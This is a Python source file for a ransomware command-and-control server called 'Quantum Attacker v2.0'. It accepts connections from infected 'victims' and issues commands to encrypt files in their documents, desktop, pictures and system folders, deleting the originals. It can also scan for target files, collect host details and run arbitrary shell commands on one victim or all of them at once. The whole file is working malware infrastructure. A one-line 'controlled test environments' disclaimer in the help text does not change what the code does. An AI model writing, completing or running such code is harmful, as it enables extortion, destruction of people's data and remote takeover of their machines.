# File: quantum_attacker_fixed.py
#!/usr/bin/env python3
"""
QUANTUM ENCRYPTION ATTACKER v2.0 - FIXED VERSION
Robust C2 Server with Error Handling
"""

import socket
import sys
import time
import os
import json
import base64
import hashlib
import threading
import struct
from queue import Queue
from datetime import datetime
import traceback

# Color codes for output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class QuantumAttacker:
    """Robust Quantum Encryption Attacker Server"""
    
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = None
        self.running = False
        self.victims = {}  # victim_id -> {'socket': socket, 'address': addr, 'connected': time}
        self.command_queue = Queue()
        self.lock = threading.Lock()
        
        self.print_banner()
        print(f"{Colors.BLUE}[*] Initializing Quantum Attacker on {host}:{port}{Colors.END}")
    
    def print_banner(self):
        """Print attacker banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{Colors.BOLD}{Colors.HEADER}
╔══════════════════════════════════════════════════════════════════╗
║                QUANTUM ATTACKER v2.0 - ROBUST                    ║
║               Advanced Encryption C2 Server                      ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.END}
    """)
    
    def print_status(self, message):
        """Print status message"""
        print(f"{Colors.BLUE}[*] {message}{Colors.END}")
    
    def print_success(self, message):
        """Print success message"""
        print(f"{Colors.GREEN}[+] {message}{Colors.END}")
    
    def print_error(self, message):
        """Print error message"""
        print(f"{Colors.RED}[-] {message}{Colors.END}")
    
    def print_warning(self, message):
        """Print warning message"""
        print(f"{Colors.YELLOW}[!] {message}{Colors.END}")
    
    def start_server(self):
        """Start the C2 server"""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(10)
            self.running = True
            
            self.print_success(f"C2 Server started on {self.host}:{self.port}")
            self.print_status("Waiting for victims...")
            
            # Start connection acceptor
            accept_thread = threading.Thread(target=self._accept_connections, daemon=True)
            accept_thread.start()
            
            # Start command interface
            self._command_interface()
            
        except Exception as e:
            self.print_error(f"Failed to start server: {e}")
            traceback.print_exc()
        finally:
            self.cleanup()
    
    def _accept_connections(self):
        """Accept incoming victim connections"""
        while self.running:
            try:
                client_socket, client_addr = self.server.accept()
                client_socket.settimeout(30)
                victim_id = f"{client_addr[0]}:{client_addr[1]}"
                
                with self.lock:
                    self.victims[victim_id] = {
                        "socket": client_socket,
                        "address": client_addr,
                        "connected": time.time(),
                        "status": "connected"
                    }
                
                self.print_success(f"New victim connected: {victim_id}")
                
                # Handle victim in separate thread
                victim_thread = threading.Thread(
                    target=self._handle_victim,
                    args=(victim_id, client_socket, client_addr),
                    daemon=True
                )
                victim_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    self.print_error(f"Accept error: {e}")
    
    def _handle_victim(self, victim_id, client_socket, client_addr):
        """Handle individual victim connection - FIXED VERSION"""
        try:
            # Send initial handshake
            handshake = {
                "type": "handshake",
                "attacker_id": hashlib.sha256(str(time.time()).encode()).hexdigest()[:16],
                "timestamp": time.time(),
                "version": "2.0"
            }
            
            self._send_json(client_socket, handshake)
            
            # Receive victim response
            response = self._receive_json(client_socket, timeout=10)
            if response and response.get("type") == "handshake_response":
                self.print_success(f"Victim {victim_id} handshake successful")
                
                # Send session confirmation
                confirmation = {
                    "type": "session_confirmation",
                    "status": "active",
                    "timestamp": time.time()
                }
                self._send_json(client_socket, confirmation)
                
                # Main communication loop
                while self.running:
                    try:
                        # Check for queued commands
                        if not self.command_queue.empty():
                            cmd_data = self.command_queue.get()
                            if cmd_data.get("victim_id") == victim_id or cmd_data.get("victim_id") == "all":
                                if self._send_json(client_socket, cmd_data["command"]):
                                    self.print_status(f"Command sent to {victim_id}")
                                self.command_queue.task_done()
                        
                        # Receive victim messages
                        try:
                            data = self._receive_json(client_socket, timeout=1)
                            if data:
                                self._process_victim_response(victim_id, data)
                        except socket.timeout:
                            continue
                        except Exception as e:
                            self.print_error(f"Receive error from {victim_id}: {e}")
                            break
                            
                    except Exception as e:
                        self.print_error(f"Error in victim loop {victim_id}: {e}")
                        break
                        
        except Exception as e:
            self.print_error(f"Victim handler error for {victim_id}: {e}")
            traceback.print_exc()
        finally:
            self._disconnect_victim(victim_id)
    
    def _send_json(self, socket_obj, data):
        """Send JSON data with error handling"""
        try:
            if not socket_obj:
                return False
            json_str = json.dumps(data)
            encoded = json_str.encode()
            length = len(encoded)
            # Send length prefix
            socket_obj.sendall(struct.pack('!I', length))
            # Send data
            socket_obj.sendall(encoded)
            return True
        except Exception as e:
            self.print_error(f"Send error: {e}")
            return False
    
    def _receive_json(self, socket_obj, timeout=30):
        """Receive JSON data with length prefix"""
        try:
            socket_obj.settimeout(timeout)
            
            # Read length prefix
            length_data = b''
            while len(length_data) < 4:
                chunk = socket_obj.recv(4 - len(length_data))
                if not chunk:
                    return None
                length_data += chunk
            
            length = struct.unpack('!I', length_data)[0]
            
            # Read JSON data
            data = b''
            while len(data) < length:
                chunk = socket_obj.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            return json.loads(data.decode())
            
        except socket.timeout:
            return None
        except json.JSONDecodeError:
            self.print_error("Invalid JSON received")
            return None
        except Exception as e:
            self.print_error(f"Receive error: {e}")
            return None
    
    def _process_victim_response(self, victim_id, data):
        """Process response from victim"""
        msg_type = data.get("type", "unknown")
        
        if msg_type == "command_output":
            output = data.get("output", "")
            print(f"\n{Colors.BOLD}[VICTIM {victim_id}]{Colors.END}")
            print(f"{output}")
            
        elif msg_type == "encryption_result":
            success = data.get("success", False)
            count = data.get("encrypted_count", 0)
            location = data.get("location", "unknown")
            session_key = data.get("session_key", "")
            if success:
                self.print_success(f"Victim {victim_id}: Encrypted {count} files in {location}")
                if session_key:
                    self.print_success(f"Session key: {session_key[:32]}...")
            else:
                self.print_error(f"Victim {victim_id}: Encryption failed")
                
        elif msg_type == "decryption_result":
            success = data.get("success", False)
            count = data.get("decrypted_count", 0)
            if success:
                self.print_success(f"Victim {victim_id}: Decrypted {count} files")
            else:
                self.print_error(f"Victim {victim_id}: Decryption failed")
                
        elif msg_type == "scan_result":
            results = data.get("results", {})
            print(f"\n{Colors.BOLD}[SCAN {victim_id}]{Colors.END}")
            for location, info in results.get("locations", {}).items():
                targets = info.get('target_files', 0)
                encrypted = info.get('encrypted_files', 0)
                print(f"  {location}: {targets} target files, {encrypted} encrypted")
                
        elif msg_type == "status":
            status = data.get("status", {})
            print(f"\n{Colors.BOLD}[STATUS {victim_id}]{Colors.END}")
            print(f"  ID: {status.get('victim_id', 'unknown')}")
            print(f"  Hostname: {status.get('hostname', 'unknown')}")
            print(f"  Platform: {status.get('platform', 'unknown')}")
            print(f"  Encrypted files: {status.get('encrypted_files', 0)}")
                
        elif msg_type == "error":
            error_msg = data.get("error", "Unknown error")
            self.print_error(f"Victim {victim_id} error: {error_msg}")
    
    def _disconnect_victim(self, victim_id):
        """Cleanly disconnect a victim"""
        with self.lock:
            if victim_id in self.victims:
                try:
                    victim_info = self.victims[victim_id]
                    if victim_info["socket"]:
                        victim_info["socket"].close()
                except:
                    pass
                del self.victims[victim_id]
                self.print_warning(f"Victim {victim_id} disconnected")
    
    def _command_interface(self):
        """Main command interface - FIXED INPUT HANDLING"""
        while self.running:
            try:
                # Show connected victims
                self._show_victims_status()
                
                # Show menu
                self._show_menu()
                
                # Get command - FIXED: Clear input buffer
                try:
                    cmd_input = input(f"\n{Colors.BLUE}quantum>{Colors.END} ").strip()
                except EOFError:
                    break
                except KeyboardInterrupt:
                    self.print_status("\nShutting down gracefully...")
                    self.running = False
                    break
                
                if not cmd_input:
                    continue
                    
                # Process command
                self._process_command(cmd_input)
                    
            except KeyboardInterrupt:
                self.print_status("\nShutting down gracefully...")
                self.running = False
                break
            except Exception as e:
                self.print_error(f"Command interface error: {e}")
                traceback.print_exc()
    
    def _show_victims_status(self):
        """Show connected victims status"""
        with self.lock:
            victim_count = len(self.victims)
        
        if victim_count > 0:
            print(f"\n{Colors.BOLD}Connected Victims ({victim_count}):{Colors.END}")
            with self.lock:
                for i, victim_id in enumerate(self.victims.keys(), 1):
                    victim_info = self.victims[victim_id]
                    conn_time = time.time() - victim_info["connected"]
                    print(f"  {i}. {victim_id} ({conn_time:.0f}s)")
        else:
            print(f"\n{Colors.YELLOW}No victims connected{Colors.END}")
    
    def _show_menu(self):
        """Show command menu"""
        print(f"\n{Colors.BOLD}Available Commands:{Colors.END}")
        print("  1. encrypt <victim> <location>  - Encrypt files")
        print("  2. decrypt <victim>             - Decrypt files")
        print("  3. scan <victim>                - Scan for files")
        print("  4. status <victim>              - Get victim status")
        print("  5. shell <victim> <command>     - Execute command")
        print("  6. broadcast <command>          - Send to all victims")
        print("  7. list                         - List victims")
        print("  8. help                         - Show detailed help")
        print("  9. clear                        - Clear screen")
        print("  10. exit                        - Exit attacker")
    
    def _process_command(self, cmd_input):
        """Process user command"""
        cmd_lower = cmd_input.lower()
        
        if cmd_lower == "exit":
            self.print_status("Shutting down...")
            self.running = False
            
        elif cmd_lower == "help":
            self._show_help()
            
        elif cmd_lower == "list":
            self._show_victims_status()
            
        elif cmd_lower == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
            
        elif cmd_lower.startswith("encrypt "):
            self._handle_encrypt(cmd_input)
            
        elif cmd_lower.startswith("decrypt "):
            self._handle_decrypt(cmd_input)
            
        elif cmd_lower.startswith("scan "):
            self._handle_scan(cmd_input)
            
        elif cmd_lower.startswith("status "):
            self._handle_status(cmd_input)
            
        elif cmd_lower.startswith("shell "):
            self._handle_shell(cmd_input)
            
        elif cmd_lower.startswith("broadcast "):
            self._handle_broadcast(cmd_input)
            
        else:
            self.print_error(f"Unknown command: {cmd_input}")
            self.print_status("Type 'help' for available commands")
    
    def _handle_encrypt(self, cmd_input):
        """Handle encrypt command"""
        parts = cmd_input.split()
        if len(parts) < 3:
            self.print_error("Usage: encrypt <victim_id> <location>")
            self.print_error("Locations: all, documents, desktop, downloads, pictures, music, videos, system")
            return
        
        victim_id = parts[1]
        location = parts[2]
        
        if not self._validate_victim(victim_id):
            return
        
        command = {
            "type": "encrypt",
            "location": location,
            "timestamp": time.time(),
            "delete_original": True  # Add flag to delete original
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        self.print_status(f"Encryption command queued for {victim_id}")
        self.print_warning(f"WARNING: Original files will be deleted after encryption!")
    
    def _handle_decrypt(self, cmd_input):
        """Handle decrypt command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            self.print_error("Usage: decrypt <victim_id>")
            return
        
        victim_id = parts[1]
        
        if not self._validate_victim(victim_id):
            return
        
        command = {
            "type": "decrypt",
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        self.print_status(f"Decryption command queued for {victim_id}")
    
    def _handle_scan(self, cmd_input):
        """Handle scan command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            self.print_error("Usage: scan <victim_id>")
            return
        
        victim_id = parts[1]
        
        if not self._validate_victim(victim_id):
            return
        
        command = {
            "type": "scan",
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        self.print_status(f"Scan command queued for {victim_id}")
    
    def _handle_status(self, cmd_input):
        """Handle status command"""
        parts = cmd_input.split()
        if len(parts) < 2:
            self.print_error("Usage: status <victim_id>")
            return
        
        victim_id = parts[1]
        
        if not self._validate_victim(victim_id):
            return
        
        command = {
            "type": "status",
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        self.print_status(f"Status command queued for {victim_id}")
    
    def _handle_shell(self, cmd_input):
        """Handle shell command"""
        parts = cmd_input.split(maxsplit=2)
        if len(parts) < 3:
            self.print_error("Usage: shell <victim_id> <command>")
            return
        
        victim_id = parts[1]
        shell_cmd = parts[2]
        
        if not self._validate_victim(victim_id):
            return
        
        command = {
            "type": "command",
            "command": shell_cmd,
            "timestamp": time.time()
        }
        
        self.command_queue.put({
            "victim_id": victim_id,
            "command": command
        })
        
        self.print_status(f"Shell command queued for {victim_id}")
    
    def _handle_broadcast(self, cmd_input):
        """Handle broadcast command"""
        parts = cmd_input.split(maxsplit=1)
        if len(parts) < 2:
            self.print_error("Usage: broadcast <command>")
            return
        
        shell_cmd = parts[1]
        
        with self.lock:
            if not self.victims:
                self.print_error("No victims connected")
                return
        
        command = {
            "type": "command",
            "command": shell_cmd,
            "timestamp": time.time()
        }
        
        with self.lock:
            for victim_id in self.victims:
                self.command_queue.put({
                    "victim_id": victim_id,
                    "command": command
                })
        
        self.print_status(f"Broadcast command queued for {len(self.victims)} victims")
    
    def _validate_victim(self, victim_id):
        """Check if victim exists"""
        with self.lock:
            if victim_id not in self.victims:
                self.print_error(f"Victim {victim_id} not found")
                if self.victims:
                    self.print_status(f"Available victims: {', '.join(self.victims.keys())}")
                return False
        return True
    
    def _show_help(self):
        """Show detailed help"""
        help_text = f"""
{Colors.BOLD}QUANTUM ATTACKER v2.0 - COMMAND REFERENCE{Colors.END}

{Colors.BOLD}IMPORTANT SECURITY WARNING:{Colors.END}
  • Original files are DELETED after encryption
  • Keep the session key safe for decryption
  • Use only in controlled test environments

{Colors.BOLD}BASIC COMMANDS:{Colors.END}
  help          - Show this help
  list          - List connected victims
  clear         - Clear screen
  exit          - Exit attacker

{Colors.BOLD}ENCRYPTION/DECRYPTION:{Colors.END}
  encrypt <victim> <location>
    Encrypt files on victim machine
    Original files are DELETED after encryption
    Session key is displayed - KEEP IT SAFE
    Locations: all, documents, desktop, downloads, pictures, music, videos, system
    
  decrypt <victim>
    Decrypt previously encrypted files
    Requires session key from encryption

{Colors.BOLD}SYSTEM COMMANDS:{Colors.END}
  scan <victim>
    Scan victim system for target files
    
  status <victim>
    Get detailed victim status information

{Colors.BOLD}SHELL COMMANDS:{Colors.END}
  shell <victim> <command>
    Execute shell command on victim
    Examples: shell <victim> whoami
              shell <victim> ipconfig
              shell <victim> dir
    
  broadcast <command>
    Send shell command to all connected victims

{Colors.BOLD}EXAMPLES:{Colors.END}
  encrypt 192.168.1.100:12345 documents
  decrypt 192.168.1.100:12345
  scan 192.168.1.100:12345
  shell 192.168.1.100:12345 "whoami && ipconfig"
  broadcast "echo Quantum Attacker Active"
  status 192.168.1.100:12345

{Colors.BOLD}CONNECTION:{Colors.END}
  • Default port: 5555
  • Victims connect automatically
  • Multiple victims supported
  • Automatic reconnection handling
"""
        print(help_text)
    
    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        
        # Disconnect all victims
        with self.lock:
            victims_copy = list(self.victims.keys())
            for victim_id in victims_copy:
                self._disconnect_victim(victim_id)
        
        # Close server
        if self.server:
            try:
                self.server.close()
            except:
                pass
        
        self.print_status("Attacker shutdown complete")

def main():
    """Main function"""
    try:
        # Configuration
        HOST = '0.0.0.0'
        PORT = 5555
        
        # Parse command line arguments
        if len(sys.argv) >= 2:
            HOST = sys.argv[1]
        if len(sys.argv) >= 3:
            PORT = int(sys.argv[2])
        
        attacker = QuantumAttacker(host=HOST, port=PORT)
        attacker.start_server()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Shutdown by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Fatal error: {e}{Colors.END}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
